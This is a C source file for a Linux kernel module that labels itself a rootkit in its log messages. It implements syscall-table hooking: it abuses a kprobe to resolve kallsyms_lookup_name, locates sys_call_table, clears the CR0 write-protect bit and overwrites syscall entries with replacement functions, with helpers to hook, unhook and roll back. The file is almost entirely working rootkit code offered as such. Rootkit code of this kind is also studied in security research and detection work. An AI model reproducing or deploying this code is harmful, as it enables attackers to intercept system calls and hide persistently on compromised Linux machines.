#include "hooking.h"

#include "macro_utils.h"
#include <asm-generic/errno-base.h>
#include <asm/processor-flags.h>
#include <asm/special_insns.h>
#include <linux/kprobes.h>
#include <linux/printk.h>

static kallsyms_t lookup_name    = NULL; // Function pointer for `kallsyms_lookup_name()`.
static sysfun_t *p_syscall_table = NULL; // Pointer to the syscall table.

/**
 * Writes the given value to the CR0 register.
 *
 * @param val The value to write
 */
static inline void cr0_write(unsigned long val)
{
    asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory");
}

/**
 * Unprotects memory by clearing the WP (write-protected) bit of the CR0 register.
 *
 * @return The original value of the CR0 register
 */
static inline unsigned long unprotect_memory(void)
{
    unsigned long ul_orig_cr0 = 0;
    unsigned long ul_new_cr0  = 0;

    ul_orig_cr0 = native_read_cr0();           // in special_insns.h
    ul_new_cr0  = ul_orig_cr0 & ~(X86_CR0_WP); // in processor-flags.h
    cr0_write(ul_new_cr0);
    return ul_orig_cr0;
}

/**
 * Restores the original value of the CR0 register.
 *
 * @param ul_orig_cr0 The original value of the CR0 register
 */
static inline void protect_memory(const unsigned long ul_orig_cr0)
{
    cr0_write(ul_orig_cr0);
}

int init_hooking(void)
{
    int i_err = 0;

    // Declare what we need to find
    struct kprobe probe = {
        .symbol_name = KALLSYMS_NAME,
    };

    IF_U (lookup_name != NULL) {
        pr_err("[ROOTKIT] Hooking module already initialized.\n");
        return -EALREADY;
    }

    i_err = register_kprobe(&probe);
    IF_U (i_err) {
        pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.\n");
        return i_err;
    }

    // Function pointer type of kallsyms_lookup_name()
    lookup_name = (kallsyms_t)(probe.addr);
    pr_info("[ROOTKIT] kallsym_lookup_name() address: %p\n", lookup_name);

    // Cleanup kprobe as we don't need it anymore
    unregister_kprobe(&probe);

    // Find syscall table address
    p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
    IF_U (p_syscall_table == NULL) {
        pr_err("[ROOTKIT] Failed to get sys_call_table address.\n");
        return -ENOENT;
    }

    pr_info("[ROOTKIT] Syscall table address: %p\n", p_syscall_table);

    return 0;
}

sysfun_t get_syscall_entry(const size_t sz_syscall_nr)
{
    return p_syscall_table[sz_syscall_nr];
}

void set_syscall_entry(const size_t sz_syscall_nr, const sysfun_t new_sysfun)
{
    unsigned long ul_orig_cr0 = unprotect_memory();

    p_syscall_table[sz_syscall_nr] = new_sysfun;

    protect_memory(ul_orig_cr0);
}

int hook_syscall(hook_t *const p_hook)
{
    pr_info("[ROOTKIT] Hooking syscall %zu\n", p_hook->sz_syscall_nr);

    *(p_hook->p_orig_sysfun) = get_syscall_entry(p_hook->sz_syscall_nr);
    set_syscall_entry(p_hook->sz_syscall_nr, p_hook->new_sysfun);

    return 0;
}

void unhook_syscall(const hook_t *const p_hook)
{
    pr_info("[ROOTKIT] Unhooking syscall %zu\n", p_hook->sz_syscall_nr);

    set_syscall_entry(p_hook->sz_syscall_nr, *(p_hook->p_orig_sysfun));
}

int hook_syscalls(hook_t p_hooks[], const size_t sz_count)
{
    int i_err = 0;
    size_t i;

    for (i = 0; i < sz_count; ++i) {
        i_err = hook_syscall(&p_hooks[i]);
        IF_U (i_err) {
            pr_err("[ROOTKIT] Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);

            // Rollback previous hooks before returning the error
            while (i > 0) {
                i -= 1;
                unhook_syscall(&p_hooks[i]);
            }

            return i_err;
        }
    }

    return 0;
}

void unhook_syscalls(const hook_t p_hooks[], const size_t sz_count)
{
    size_t i;
    for (i = 0; i < sz_count; ++i) {
        unhook_syscall(&p_hooks[i]);
    }
}
